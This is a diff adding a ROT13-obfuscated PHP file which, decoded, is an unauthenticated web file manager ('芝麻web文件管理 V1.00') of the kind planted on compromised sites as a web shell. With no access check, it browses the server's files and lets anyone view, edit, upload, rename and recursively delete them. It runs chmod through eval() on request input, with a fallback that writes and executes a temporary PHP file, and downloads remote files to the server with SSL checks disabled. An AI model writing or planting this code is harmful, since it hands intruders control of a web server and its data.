@@ -1,0 +1,259 @@
+<?cuc
+rEEbe_eRcbeGvat(0);
+$jjjebbg=vffrg($_FREIRE['QBPHZRAG_EBBG'])?gevz($_FREIRE['QBPHZRAG_EBBG']):'';
+$erd_hev=vffrg($_FREIRE['ERDHRFG_HEV'])?gevz($_FREIRE['ERDHRFG_HEV']):'';
+$erd_hev!=''?($erd_hev_nee=rkcybqr('?',$erd_hev)).($fpevcg_anzr=$erd_hev_nee[0]):($fpevcg_anzr=vffrg($_FREIRE['FPEVCG_ANZR'])?gevz($_FREIRE["FPEVCG_ANZR"]):'');
+$fpevcg_svyranzr=vffrg($_FREIRE['FPEVCG_SVYRANZR'])?gevz($_FREIRE['FPEVCG_SVYRANZR']):'';
+vs ($fpevcg_svyranzr=='') $fpevcg_svyranzr=__SVYR__ ;
+vs ($jjjebbg=='' && $fpevcg_anzr!='' && $fpevcg_svyranzr!='') $jjjebbg=fge_ercynpr($fpevcg_anzr,'',$fpevcg_svyranzr);
+$jjjebbg=fge_ercynpr('\\','/',$jjjebbg);
+$qve=vffrg($_TRG['q'])?gevz($_TRG['q']):'';
+$qve=fge_ercynpr('\\','/',$qve);
+$svyr=vffrg($_TRG['s'])?gevz($_TRG['s']):'';
+$svyr=fge_ercynpr('\\','/',$svyr);
+$npgvba=vffrg($_TRG['n'])?gevz($_TRG['n']):'';
+vs ( $npgvba=='' )
+{
+    $pheerag_qve=$qve==''?$jjjebbg:$qve;
+    $pheerag_qve=egevz($pheerag_qve,'/');
+    $pheerag_qve_ani='';
+    $qve_cngu='';
+    $pheerag_qve_fcyvg=rkcybqr('/',$pheerag_qve);
+    sbernpu( $pheerag_qve_fcyvg nf $qve )
+    {
+        $qve_cngu.=$qve.'/';
+        $pheerag_qve_ani.='<n uers="?q='.$qve_cngu.'">'.$qve.'/</n>';
+    }
+    $qve_ebjf='';
+    $svyr_ebjf='';
+    $pheerag_qve_yvfg=fPnAQve($pheerag_qve);
+    $ebj_vq=0;
+    sbernpu( $pheerag_qve_yvfg nf $gnetrg_anzr )
+    {
+        vs ( $gnetrg_anzr=='.' || $gnetrg_anzr=='..' ) pbagvahr;
+        $gnetrg=$pheerag_qve.'/'.$gnetrg_anzr;
+        $gnetrg_nuers=fgecbf($gnetrg,$jjjebbg)===0?'<n uers="'.fge_ercynpr($jjjebbg,'',$gnetrg).'" gnetrg="_oynax">'.$gnetrg_anzr.'</n>':$gnetrg_anzr;
+        $ebj_vq++;
+        $gnetrg_h_vq=sVyRBjARe($gnetrg);
+        $gnetrg_h_ngg=cbFVk_TRgcJHvq($gnetrg_h_vq);
+        $gnetrg_bjare=$gnetrg_h_ngg['anzr'];
+        $gnetrg_crez=trg_dk($gnetrg);
+        $gnetrg_zgvzr=qngr('L-z-q U:v:f',sVYrZGvZr($gnetrg));
+        vs ( vf_qve($gnetrg) )
+        {
+            $qve_ebjf.='<ge pynff="gy"><gq><v pynff="sn sn-sbyqre" fglyr="sbag-fvmr:20ck;pbybe:benatr;"></v></gq><gq><n uers="?q='.$gnetrg.'">'.$gnetrg_anzr.'</n></gq><gq></gq><gq>(<n uers="#"  bapyvpx="fubj_vachg_obk(\'dk'.$ebj_vq.'\',\''.$gnetrg.'\',\'q\',\'dk\');">'.$gnetrg_crez.'</n>)'.$gnetrg_bjare.'<fcna vq="dk'.$ebj_vq.'"></fcna></gq><gq>'.$gnetrg_zgvzr.'</gq><gq><n uers="#" bapyvpx="fubj_vachg_obk(\'tz'.$ebj_vq.'\',\''.$gnetrg.'\',\'q\',\'tz\');">改名</n>|<n uers="#" bapyvpx="pbasvez_fp(\''.$gnetrg.'\',\'q\');">删除</n><fcna vq="tz'.$ebj_vq.'"></fcna></gq></ge>';
+        }ryfr
+        {
+            $gnetrg_sfvmr=sVYrfVmR($gnetrg);
+            $gnetrg_sfvmr<1024?$gnetrg_sfvmr.=' O':($gnetrg_sfvmr=ebhaq($gnetrg_sfvmr/1024,1)).($gnetrg_sfvmr<1024?$gnetrg_sfvmr.=' XO':$gnetrg_sfvmr=ebhaq($gnetrg_sfvmr/1024,2).' ZO');
+            $svyr_ebjf.='<ge pynff="gy"><gq><v pynff="sn sn-svyr" fglyr="sbag-fvmr:20ck;pbybe:terl;"></gq><gq>'.$gnetrg_nuers.'</gq><gq>'.$gnetrg_sfvmr.'</gq><gq>(<n uers="#" bapyvpx="fubj_vachg_obk(\'dk'.$ebj_vq.'\',\''.$gnetrg.'\',\'s\',\'dk\');">'.$gnetrg_crez.'</n>)'.$gnetrg_bjare.'<fcna vq="dk'.$ebj_vq.'"></fcna></gq><gq>'.$gnetrg_zgvzr.'</gq><gq><n uers="#" bapyvpx="jvaqbj.bcra(\'?s='.$gnetrg.'&n=px\',\'_oynax\',\'jvqgu=800,urvtug=600,gbc=200,yrsg=300\');">查看</n>|<n uers="?s='.$gnetrg.'&n=ow">编辑</n>|<n uers="#" bapyvpx="fubj_vachg_obk(\'tz'.$ebj_vq.'\',\''.$gnetrg.'\',\'s\',\'tz\');">改名</n>|<n uers="#" bapyvpx="pbasvez_fp(\''.$gnetrg.'\',\'s\');">删除</n><fcna vq="tz'.$ebj_vq.'"></fcna></gq></ge>';
+        }
+    }
+    $qvi_ugzy='<gnoyr pryyfcnpvat="10">
+                 <ge><gq pbyfcna="6"><sbez anzr="sbez_hc" vq="sbez_hc" zrgubq="cbfg" npgvba="?q='.$pheerag_qve.'&n=hc" rapglcr="zhygvcneg/sbez-qngn"><n uers="?q='.$jjjebbg.'"><v pynff="sn sn-ubzr" fglyr="sbag-fvmr:30ck;pbybe:benatr;"></v></n>&aofc;&aofc;当前目录:'.$pheerag_qve_ani.'&aofc;&aofc; <v pynff="sn sn-hcybnq" fglyr="sbag-fvmr:20ck;pbybe:terl;" bapyvpx="qbphzrag.trgRyrzragOlVq(\'svyr_hc\').pyvpx();"><vachg vq="svyr_hc" anzr="svyr_hc" glcr="svyr" fglyr="qvfcynl:abar" bapunatr="qbphzrag.trgRyrzragOlVq(\'sbez_hc\').fhozvg();"></sbez></gq></ge>
+                 <ge><gq pbyfcna="6"><sbez anzr="sbez_gw" zrgubq="cbfg" npgvba="?q='.$pheerag_qve.'&n=gw">新项目名称:<vachg anzr="g_anzr" glcr="grkg" fvmr="25"> <fryrpg anzr="g_glcr"><bcgvba inyhr="gw_s">添加文件</bcgvba><bcgvba inyhr="gw_q">添加目录</bcgvba><bcgvba inyhr="gw_km">下载HEY</bcgvba></fryrpg> <vachg anzr="fhozvg" glcr="fhozvg" inyhr="执行"></sbez></gq></ge>
+                 '.($ebj_vq==0?'<ge><gq>内容为空或无权限查看</gq></ge>':$qve_ebjf.$svyr_ebjf).'
+              </gnoyr>';  
+}ryfrvs ( $npgvba=='fp' )
+{
+    vs ( $svyr!='' )
+    {
+        hAyVax($svyr); whzc_gb('?q='.qvEAnZr($svyr));
+    }ryfrvs( $qve!='' )
+    {
+        ez_es($qve); whzc_gb('?q='.QVeanZr($qve));
+    }
+    rkvg;
+}ryfrvs( $npgvba=='tz' )
+{
+    $tz=vffrg($_CBFG['tz'])?gevz($_CBFG['tz']):'';
+    vs ( $tz!='' )
+    {
+        $byq_s=$svyr==''?$qve:$svyr;
+        vs ( $byq_s!='' && svyr_rkvfgf($byq_s) )
+        {
+            $byq_qve=QVeaNzr($byq_s); eRaNzr($byq_s,$byq_qve.'/'.$tz); whzc_gb('?q='.$byq_qve);
+        }
+    }ryfr
+    {
+        fubj_zft('请输入新名称!','onpx');
+    }
+    rkvg;
+}ryfrvs( $npgvba=='dk' )
+{
+    $gnetrg=$qve==''?$svyr:$qve;
+    vs ( $gnetrg!='' )
+    {
+        $dk=vffrg($_CBFG['dk'])?gevz($_CBFG['dk']):'';
+        vs ( $dk!='' && vf_ahzrevp($dk) && fhofge($dk,0,1)=='0' )
+        {
+            frg_dk($gnetrg,$dk); whzc_gb('?q='.qVEanzR($gnetrg));
+        }ryfr
+        {
+            fubj_zft('请输入新权限!','onpx');
+        }
+    }
+    rkvg;
+}ryfrvs( $npgvba=='px' && $svyr!='' )
+{
+    vs ( svYRfVmr($svyr)<10000000 )
+    {
+        URnqRe('Pbagrag-Glcr:grkg/cynva; Punefrg=hgs-8;'); rpub SVyr_tRG_pbAGRagf($svyr);
+    }ryfr
+    {
+        fubj_zft('文件大小超限!','pybfr');
+    }
+    rkvg;
+}ryfrvs( $npgvba=='ow' && $svyr!='' )
+{
+    vs ( vffrg($_CBFG['s_pbagrag']) )  
+    {
+        SvyR_cHg_PBagrAgf($svyr,$_CBFG['s_pbagrag']);
+        zq5($_CBFG['s_pbagrag'])==zq5(sVYR_Trg_pBAGraGf($svyr)) ? fubj_zft('保存成功!','') : fubj_zft('保存失败!!','');
+    }
+    $s_pbagrag=vf_svyr($svyr)?fge_ercynpr('</grkgnern>','&yg;/grkgnern>',SVyr_tRG_pbagRAgF($svyr)):'';
+    $qvi_ugzy='<sbez anzr="sbez_ow" npgvba="?s='.$svyr.'&n=ow" zrgubq="cbfg">编辑当前文件:'.$svyr.'<oe><grkgnern anzr="s_pbagrag" ebjf="40" pbyf="120">'.$s_pbagrag.'</grkgnern><oe><vachg glcr="fhozvg" inyhr="保存">&aofc;&aofc;<vachg glcr="ohggba" inyhr="返回目录" bapyvpx="jvaqbj.ybpngvba.uers=\'?q='.QVeAnzR($svyr).'\';"></sbez>'; 
+}ryfrvs( $npgvba=='gw' && $qve!='' )
+{
+    $g_anzr=vffrg($_CBFG['g_anzr'])?gevz($_CBFG['g_anzr']):'';
+    vs ( $g_anzr=='' )
+    {
+        fubj_zft('请输入项目名称!','onpx');
+    }ryfr
+    {
+        vs ( $_CBFG['g_glcr']=='gw_s' ) svYr_CHg_pbAGragF($qve.'/'.$g_anzr,'');
+        vs ( $_CBFG['g_glcr']=='gw_q' ) zXQve($qve.'/'.$g_anzr,0755,gehr);
+        vs ( $_CBFG['g_glcr']=='gw_km' ) 
+        {
+            cert_zngpu('/^uggc[f]?:\/\/.+/fv',$g_anzr)==0 ? fubj_zft('下载地址格式出错!','onpx') : qbja_svyr($qve,$g_anzr) ;
+        }
+        whzc_gb('?q='.$qve);
+    }
+    rkvg;
+}ryfrvs( $npgvba=='hc' && $qve!='' && vffrg($_SVYRF['svyr_hc']) )
+{
+    ZbIR_hcYBnqRq_svyR($_SVYRF['svyr_hc']['gzc_anzr'],$qve.'/'.OnFranZr($_SVYRF['svyr_hc']['anzr'])) ? fubj_zft('上传成功!','') : fubj_zft('上传失败!','') ;
+    whzc_gb('?q='.$qve);
+    rkvg;
+}
+
+shapgvba trg_dk($g)
+{
+    $d=fhofge(fcevags('%b',sVYrcReZf($g)),-4);
+    erghea $d;
+}
+shapgvba frg_dk($g,$d)
+{
+    RiNy('pUZbQ("'.$g.'",'.$d.');');
+    vs ( trg_dk($g)!=$d )
+    {
+        $gzc_s=havdvq().'.gkg';
+        $gzc_p='<?cuc PuZBq("'.$g.'",'.$d.');?>';
+        svYR_chG_pBAgRaGf($gzc_s,$gzc_p);
+        erdhver($gzc_s);
+        HaYVaX($gzc_s);
+    }
+}
+
+shapgvba ez_es($q) 
+{
+    vs (vf_qve($q)) 
+    {
+        $s_y=fPnAQve($q);
+        sbernpu ($s_y nf $s) 
+        {
+            vs ($s=='.'||$s=='..') pbagvahr;
+            $c=$q.'/'.$s;
+            vf_qve($c)?ez_es($c):hAyvAx($c);
+        }
+        eZqVE($q);
+    }
+}
+
+shapgvba fubj_zft($zft,$tb)
+{
+    rpub '<fpevcg>nyreg("'.$zft.'");</fpevcg>'; 
+    vs ($tb=='onpx') rpub '<fpevcg>jvaqbj.uvfgbel.onpx();</fpevcg>'; 
+    vs ($tb=='pybfr') rpub '<fpevcg>jvaqbj.pybfr();</fpevcg>'; 
+}
+
+shapgvba whzc_gb($hey)
+{
+    rpub '<fpevcg>jvaqbj.ybpngvba.uers="'.$hey.'";</fpevcg>';
+}
+
+shapgvba qbja_svyr($qve,$hey)
+{
+    $f_anzr=neenl_cbc(rkcybqr('/',$hey));
+    vs ( $f_anzr=='' || vf_svyr($qve.'/'.$f_anzr) ) $f_anzr=havdvq().'.mzkm';
+    $pu=PHey_vAvg();
+    phEy_frGBcg ($pu, PHEYBCG_HEY, $hey);
+    pHeY_fRgbcg ($pu, PHEYBCG_ERGHEAGENAFSRE, 1);
+    phEY_frgBCg ($pu, PHEYBCG_PBAARPGGVZRBHG, 5);
+    phEY_frgBCg ($pu, PHEYBCG_FFY_IREVSLCRRE, snyfr);
+    phEY_frgBCg ($pu, PHEYBCG_FFY_IREVSLUBFG, snyfr);
+    phEY_frgBCg ($pu, PHEYBCG_OVANELGENAFSRE, gehr);
+    $pbagragf = pHey_rKrP($pu);
+    pHEy_PYbfR($pu);
+    vs ( rzcgl($pbagragf) ) $pbagragf=svyR_trG_pBAGragF($hey);
+    vs ( rzcgl($pbagragf) )
+    {
+        fubj_zft('下载出错!','');
+    }ryfr
+    {
+        sVyr_ChG_pBAgrAgf($qve.'/'.$f_anzr,$pbagragf);
+        fubj_zft('下载完成!','');        
+    }
+}
+
+?>
+<ugzy>
+    <urnq>
+        <gvgyr>芝麻jro文件管理</gvgyr>
+        <zrgn anzr="ebobgf" pbagrag="abar">
+        <zrgn uggc-rdhvi="Pbagrag-Glcr" Pbagrag="grkg/ugzy; Punefrg=hgs-8">
+        <yvax ery="fglyrfurrg" uers="uggcf://pqawf.pybhqsyner.pbz/nwnk/yvof/sbag-njrfbzr/4.7.0/pff/sbag-njrfbzr.zva.pff">
+    </urnq>
+    <obql>
+    <fglyr>
+    n {pbybe:#000000;grkg-qrpbengvba:abar;}
+    n:ubire {pbybe:#ss0000;}
+    .gy:ubire {onpxtebhaq-pbybe:#rrrrrr;}
+    sbez {znetva:0;}
+    </fglyr>
+    <fpevcg>
+        shapgvba fubj_vachg_obk(f,g,s,n,)
+        {
+           ine fcna=qbphzrag.trgRyrzragOlVq(f);
+           vs ( fcna.vaareUGZY=='' )
+           {
+                fcna.vaareUGZY='<sbez anzr="sbez_'+f+'" zrgubq="cbfg" npgvba="?'+s+'='+g+'&n='+n+'"><vachg anzr="'+n+'" glcr="grkg" fvmr="8"><vachg glcr="fhozvg" inyhr="提交"></sbez>';                
+           }ryfr
+           {
+                fcna.vaareUGZY='';
+           }
+        }
+        shapgvba pbasvez_fp(g,s)
+        {
+            vs (s=='q')
+            {
+                vs ( pbasvez('确定要删除此目录吗?') )
+                {
+                    jvaqbj.ybpngvba.uers='?q='+g+'&n=fp';
+                }
+            }
+            vs (s=='s')
+            {
+                vs ( pbasvez('确定要删除此文件吗?') )
+                {
+                    jvaqbj.ybpngvba.uers='?s='+g+'&n=fp';
+                }                
+            }
+        }
+    </fpevcg>
+        <qvi>
+            <u1>芝麻jro文件管理I1.00</u1>
+            <?cuc rpub $qvi_ugzy;?>
+        </qvi>
+    </obql>
+</ugzy>
